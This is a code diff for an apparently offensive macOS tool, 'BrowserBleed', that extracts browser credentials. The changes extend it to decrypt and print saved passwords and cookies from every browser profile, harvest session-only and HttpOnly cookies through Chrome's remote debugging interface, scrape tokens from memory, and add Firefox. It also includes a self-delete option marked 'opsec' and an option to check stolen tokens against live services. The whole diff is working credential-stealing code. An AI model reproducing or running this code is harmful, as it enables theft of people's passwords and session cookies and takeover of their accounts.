+    disk_cookie_keys: set[tuple[str, str]] = set()
+
     # ── Disk ──────────────────────────────────────────────────────────────────
     if do_disk:
         try:
@@ -1031,48 +1265,60 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
             master_key = None
 
         if master_key:
-            profile = os.path.join(user_data_path, "Default")
+            profiles = _enum_profiles(user_data_path)
+            if not profiles:
+                profiles = [(os.path.join(user_data_path, "Default"), "Default")]
 
-            lines.append("\n  -- [DISK] Saved Credentials --")
-            try:
-                creds = extract_credentials(profile, master_key)
-                if creds:
-                    lines.append(f"[+] {len(creds)} credential(s)\n")
-                    for c in creds:
-                        lines.append(f"  URL:      {c['url']}")
-                        lines.append(f"  Username: {c['username']}")
-                        lines.append(f"  Password: {c['password']}\n")
-                else:
-                    lines.append("  [-] None found")
-            except Exception as e:
-                lines.append(f"  [-] {e}")
+            for profile_path, profile_name in profiles:
+                lines.append(f"\n  -- [DISK] Profile: {profile_name} --")
 
-            lines.append("\n  -- [DISK] Cookies --")
-            try:
-                cookies = extract_cookies(profile, master_key)
-                if cookies:
-                    lines.append(f"[+] {len(cookies)} cookie(s)\n")
-                    for ck in cookies:
-                        lines.append(f"  Host:     {ck['host']}")
-                        lines.append(f"  Name:     {ck['name']}")
-                        lines.append(f"  Value:    {ck['value']}")
-                        lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}\n")
-                else:
-                    lines.append("  [-] None found")
-            except Exception as e:
-                lines.append(f"  [-] {e}")
-                if running:
-                    lines.append("\n  -- [CDP] Cookies --")
-                    cdp_cookies = extract_cookies_cdp(process_name)
-                    if cdp_cookies:
-                        lines.append(f"[+] {len(cdp_cookies)} cookie(s) via CDP\n")
-                        for ck in cdp_cookies:
-                            lines.append(f"  Host:     {ck['host']}")
-                            lines.append(f"  Name:     {ck['name']}")
-                            lines.append(f"  Value:    {ck['value']}")
-                            lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}\n")
+                lines.append("  -- Saved Credentials --")
+                try:
+                    creds = extract_credentials(profile_path, master_key)
+                    if creds:
+                        lines.append(f"  [+] {len(creds)} credential(s)\n")
+                        for c in creds:
+                            lines.append(f"    URL:      {c['url']}")
+                            lines.append(f"    Username: {c['username']}")
+                            lines.append(f"    Password: {c['password']}\n")
                     else:
-                        lines.append("  [-] CDP unavailable (Chrome not started with --remote-debugging-port)")
+                        lines.append("  [-] None found")
+                except Exception as e:
+                    lines.append(f"  [-] {e}")
+
+                lines.append("  -- Cookies --")
+                try:
+                    cookies = extract_cookies(profile_path, master_key)
+                    if cookies:
+                        lines.append(f"  [+] {len(cookies)} cookie(s)\n")
+                        for ck in cookies:
+                            lines.append(f"    Host:     {ck['host']}")
+                            lines.append(f"    Name:     {ck['name']}")
+                            lines.append(f"    Value:    {ck['value']}")
+                            lines.append(f"    Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{ck['samesite']}\n")
+                        disk_cookie_keys.update((c["host"], c["name"]) for c in cookies)
+                    else:
+                        lines.append("  [-] None found")
+                except Exception as e:
+                    lines.append(f"  [-] {e}")
+
+    # Always attempt CDP when browser is running; surface session-only and HttpOnly cookies
+    if running:
+        lines.append("\n  -- [CDP] Session-only Cookies --")
+        cdp_cookies = extract_cookies_cdp(process_name)
+        if cdp_cookies:
+            cdp_only = [c for c in cdp_cookies if (c["host"], c["name"]) not in disk_cookie_keys]
+            if cdp_only:
+                lines.append(f"[+] {len(cdp_only)} CDP-only cookie(s) (not present in disk extraction)\n")
+                for ck in cdp_only:
+                    lines.append(f"  Host:     {ck['host']}")
+                    lines.append(f"  Name:     {ck['name']}")
+                    lines.append(f"  Value:    {ck['value']} [CDP-only]")
+                    lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{ck['samesite']}\n")
+            else:
+                lines.append("  [-] No additional CDP-only cookies (all covered by disk extraction)")
+        else:
+            lines.append("  [-] CDP unavailable (browser not started with --remote-debugging-port)")
 
     # ── Memory ────────────────────────────────────────────────────────────────
     lines.append("\n  -- [MEMORY] Live Scrape --")
@@ -1130,7 +1376,7 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
         lines.append(f"  [{label}]  ({len(group)} unique)")
         for h in group:
             service = identify_service(label, h["value"], h.get("context", b""))
-            val     = h["value"][:100].replace("\n", "\\n").replace("\r", "\\r")
+            val     = h["value"][:512].replace("\n", "\\n").replace("\r", "\\r")
             lines.append(f"    @ {h['address']}  [{service}]  {val}")
             if do_verify:
                 result = verify_hit(label, h["value"], service)
@@ -1142,13 +1388,15 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
 
 # ── Main ───────────────────────────────────────────────────────────────────────
 def main():
+    global _do_oidc
+
     parser = argparse.ArgumentParser(
         description="BrowserBleed macOS — Browser Credential Extractor. Authorized use only."
     )
     parser.add_argument("--browser",     metavar="NAME", help="Target one browser (e.g. chrome, edge, brave)")
     parser.add_argument("--disk-only",   action="store_true", help="Skip memory scraping")
     parser.add_argument("--memory-only", action="store_true", help="Skip disk extraction")
-    parser.add_argument("--out",         metavar="PATH",      help="Output file path")
+    parser.add_argument("--out",         metavar="PATH",      help="Output file path (default: bb_results.txt next to binary)")
     parser.add_argument("--max-hits",    type=int, default=300, help="Max memory hits per browser (default: 300)")
     parser.add_argument("--self-delete", action="store_true", help="Delete script after run (opsec)")
     parser.add_argument("--verify",      action="store_true", help="Verify captured tokens against their services (outbound requests)")
@@ -1156,6 +1404,9 @@ def main():
 
     do_disk   = not args.memory_only
     do_memory = not args.disk_only
+
+    if args.verify:
+        _do_oidc = True
 
     lines = [
         "=" * 70,
@@ -1174,8 +1425,25 @@ def main():
         if not targets:
             lines.append(f"\n[!] No browser matched '{args.browser}'")
 
-    for bname, proc, path, keychain in targets:
-        lines.extend(process_browser(bname, proc, path, keychain, do_disk, do_memory, args.max_hits, args.verify))
+    # Parallelize browser processing
+    results_map: dict[int, list[str]] = {}
+    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as ex:
+        futs = {
+            ex.submit(process_browser, bname, proc, path, kc, do_disk, do_memory, args.max_hits, args.verify): (i, bname)
+            for i, (bname, proc, path, kc) in enumerate(targets)
+        }
+        for fut in concurrent.futures.as_completed(futs):
+            idx, bname = futs[fut]
+            try:
+                results_map[idx] = fut.result()
+            except Exception as e:
+                results_map[idx] = [f"\n[-] {bname}: {e}"]
+    for idx in sorted(results_map):
+        lines.extend(results_map[idx])
+
+    # Firefox (not parallelized with Chromium browsers — no Keychain, simpler)
+    if not args.browser or "firefox" in args.browser.lower():
+        lines.extend(process_firefox(_home, do_disk))
 
     report = "\n".join(lines)
 
@@ -1184,7 +1452,7 @@ def main():
     if args.out:
         out_path = args.out
     else:
-        out_path = os.path.join(_exe_dir, "browserbleed_output.txt")
+        out_path = os.path.join(_exe_dir, "bb_results.txt")
 
     with open(out_path, "w", encoding="utf-8") as f:
         f.write(report)
@@ -1201,6 +1469,6 @@ if __name__ == "__main__":
     except Exception as e:
         import traceback
         _exe_dir = os.path.dirname(sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__))
-        err_path = os.path.join(_exe_dir, "browserbleed_error.txt")
+        err_path = os.path.join(_exe_dir, "bb_error.txt")
         with open(err_path, "w") as f:
             f.write(traceback.format_exc())
